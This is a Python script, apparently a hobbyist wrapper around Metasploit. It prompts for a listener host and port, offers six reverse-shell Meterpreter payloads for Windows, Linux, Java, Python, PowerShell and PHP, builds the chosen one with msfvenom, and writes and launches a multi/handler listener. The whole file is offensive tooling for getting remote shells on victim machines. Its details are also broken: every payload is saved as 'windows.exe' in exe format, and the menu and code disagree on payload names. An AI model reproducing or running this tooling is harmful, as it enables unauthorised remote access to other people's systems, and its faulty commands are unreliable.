import os
import time
import sys
import colorama
from colorama import init, Fore, Back, Style

def write_file(path, text):
    file_write = open(path, "w")
    file_write.write(text)
    file_write.close()

def Windows_metasploit():
    # os.system('sudo msfconsole -r Windows.rc')
    print('sudo msfconsole -r Windows.rc')

def Linux_metasploit():
    os.system('sudo msfconsole -r Linux.rc')

def Java_Meterpreter():
    os.system('sudo msfconsole -r Java.rc')

def Python_Meterpreter():
    os.system('sudo msfconsole -r Python.rc')

def Powershell_Meterpreter():
    os.system('sudo msfconsole -r Powershell.rc')

def PHP_Meterpreter():
    os.system('sudo msfconsole -r PHP.rc')


print(Style.BRIGHT + Fore.GREEN + 'Ok First Things First Set Your LHOST')
LHOST = input(Style.BRIGHT + Fore.GREEN + 'Set Your LHOST: ')
time.sleep(2)
os.system('clear')

time.sleep(2)
print(Style.BRIGHT + Fore.GREEN + 'Ok Now Set Your LPORT')
LPORT = input(Style.BRIGHT + Fore.GREEN + 'Set Your LPORT: ')
time.sleep(2)
os.system('clear')


print(Style.BRIGHT + Fore.MAGENTA + ' ______   ______   _______  _        _______           ______   _______ ')
print(Style.BRIGHT + Fore.MAGENTA + '(  __  \ / ___  \ (  ____ )( \      (  __   )|\     /|/ ___  \ (  ____ )')
print(Style.BRIGHT + Fore.MAGENTA + '| (  \  )\/   \  \| (    )|| (      | (  )  |( \   / )\/   \  \| (    )|')
print(Style.BRIGHT + Fore.MAGENTA + '| |   ) |   ___) /| (____)|| |      | | /   | \ (_) /    ___) /| (____)|')
print(Style.BRIGHT + Fore.MAGENTA + '| |   | |  (___ ( |  _____)| |      | (/ /) |  \   /    (___ ( |     __)')
print(Style.BRIGHT + Fore.MAGENTA + '| |   ) |      ) \| (      | |      |   / | |   ) (         ) \| (\ (   ')
print(Style.BRIGHT + Fore.MAGENTA + '| (__/  )/\___/  /| )      | (____/\|  (__) |   | |   /\___/  /| ) \ \__')
print(Style.BRIGHT + Fore.MAGENTA + '(______/ \______/ |/       (_______/(_______)   \_/   \______/ |/   \__/')


print(Style.BRIGHT + Fore.LIGHTCYAN_EX + '[1] windows/meterpreter/reverse_tcp')
print(Style.BRIGHT + Fore.LIGHTCYAN_EX + '[2] linux/x86/meterpreter/reverse_tcp')
print(Style.BRIGHT + Fore.LIGHTCYAN_EX + '[3] java/meterpreter/bind_tcp')           #Tyoes Of Payloads That The User Is Able To Choose From
print(Style.BRIGHT + Fore.LIGHTCYAN_EX + '[4] python/meterpreter/reverse_tcp')
print(Style.BRIGHT + Fore.LIGHTCYAN_EX + '[5] cmd/windows/powershell_reverse_tcp')
print(Style.BRIGHT + Fore.LIGHTCYAN_EX + '[6] php/meterpreter/reverse_tcp')
print('\n')

choice = input(Style.BRIGHT + Fore.RED + 'Pwned@LMFAO~# ')

if choice == '1':
    time.sleep(2)
    print('[*] Creating The Payload....')
    time.sleep(2)
    # LHOST = input('Set Your LHOST: ')
    # LPORT = input('Set Your LPORT: ')
    time.sleep(2)
    # os.system('sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=' + LHOST + ' LPORT=' + LPORT + ' -f exe -o windows.exe')
    os.system('sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=' + LHOST + ' LPORT=' + LPORT + ' -f exe -o windows.exe')

    write_file('Windows.rc', 'use multi/handler\nset payload windows/meterpreter/reverse_tcp\nset LHOST ' + LHOST + '\nset LPORT ' + LPORT + '\nset ExitOnSession false\nset AutoVerifySession false\nset AutoSystemInfo false\nset AutoLoadStdapi false\nexploit -j\n')
    Windows_metasploit()

if choice == '2':
    time.sleep(2)
    print(Style.BRIGHT + Fore.LIGHTMAGENTA_EX + '[*] Creating The Payload....')
    time.sleep(2)
    # LHOST = input('Set Your LHOST: ')
    # LPORT = input('Set Your LPORT: ')
    time.sleep(2)
    # os.system('sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=' + LHOST + ' LPORT=' + LPORT + ' -f exe -o windows.exe')
    os.system('sudo msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=' + LHOST + ' LPORT=' + LPORT + ' -f exe -o windows.exe')

    write_file('Linux.rc', 'use multi/handler\nset payload linux/x86/meterpreter_reverse_tcp\nset LHOST ' + LHOST + '\nset LPORT ' + LPORT + '\nset ExitOnSession false\nset AutoVerifySession false\nset AutoSystemInfo false\nset AutoLoadStdapi false\nexploit -j\n')
    Linux_metasploit()

if choice == '3':
    time.sleep(2)
    print(Style.BRIGHT + Fore.LIGHTMAGENTA_EX + '[*] Creating The Payload....')
    time.sleep(2)
    # LHOST = input('Set Your LHOST: ')
    # LPORT = input('Set Your LPORT: ')
    time.sleep(2)
    # os.system('sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=' + LHOST + ' LPORT=' + LPORT + ' -f exe -o windows.exe')
    os.system('sudo msfvenom -p java/meterpreter/reverse_tcp LHOST=' + LHOST + ' LPORT=' + LPORT + ' -f exe -o windows.exe')

    write_file('Java.rc', 'use multi/handler\nset payload java/meterpreter/reverse_tcp\nset LHOST ' + LHOST + '\nset LPORT ' + LPORT + '\nset ExitOnSession false\nset AutoVerifySession false\nset AutoSystemInfo false\nset AutoLoadStdapi false\nexploit -j\n')
    Java_Meterpreter()

if choice == '4':
    time.sleep(2)
    print(Style.BRIGHT + Fore.LIGHTMAGENTA_EX + '[*] Creating The Payload....')
    time.sleep(2)
    # LHOST = input('Set Your LHOST: ')
    # LPORT = input('Set Your LPORT: ')
    time.sleep(2)
    # os.system('sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=' + LHOST + ' LPORT=' + LPORT + ' -f exe -o windows.exe')
    os.system('sudo msfvenom -p python/meterpreter/reverse_tcp LHOST=' + LHOST + ' LPORT=' + LPORT + ' -f exe -o windows.exe')

    write_file('Python.rc', 'use multi/handler\nset payload python/meterpreter/reverse_tcp\nset LHOST ' + LHOST + '\nset LPORT ' + LPORT + '\nset ExitOnSession false\nset AutoVerifySession false\nset AutoSystemInfo false\nset AutoLoadStdapi false\nexploit -j\n')
    Python_Meterpreter()

if choice == '5':
    time.sleep(2)
    print(Style.BRIGHT + Fore.LIGHTMAGENTA_EX + '[*] Creating The Payload....')
    time.sleep(2)
    # LHOST = input('Set Your LHOST: ')
    # LPORT = input('Set Your LPORT: ')
    time.sleep(2)
    # os.system('sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=' + LHOST + ' LPORT=' + LPORT + ' -f exe -o windows.exe')
    os.system('sudo msfvenom -p cmd/windows/powershell_reverse_tcp LHOST=' + LHOST + ' LPORT=' + LPORT + ' -f exe -o windows.exe')

    write_file('Powershell.rc', 'use multi/handler\nset payload cmd/windows/powershell_reverse_tcp\nset LHOST ' + LHOST + '\nset LPORT ' + LPORT + '\nset ExitOnSession false\nset AutoVerifySession false\nset AutoSystemInfo false\nset AutoLoadStdapi false\nexploit -j\n')
    Powershell_Meterpreter()

if choice == '6':
    time.sleep(2)
    print(Style.BRIGHT + Fore.LIGHTMAGENTA_EX + '[*] Creating The Payload....')
    time.sleep(2)
    # LHOST = input('Set Your LHOST: ')
    # LPORT = input('Set Your LPORT: ')
    time.sleep(2)
    # os.system('sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=' + LHOST + ' LPORT=' + LPORT + ' -f exe -o windows.exe')
    os.system('sudo msfvenom -p php/meterpreter/reverse_tcp LHOST=' + LHOST + ' LPORT=' + LPORT + ' -f exe -o windows.exe')

    write_file('PHP.rc', 'use multi/handler\nset payload php/meterpreter/reverse_tcp\nset LHOST ' + LHOST + '\nset LPORT ' + LPORT + '\nset ExitOnSession false\nset AutoVerifySession false\nset AutoSystemInfo false\nset AutoLoadStdapi false\nexploit -j\n')
    PHP_Meterpreter()

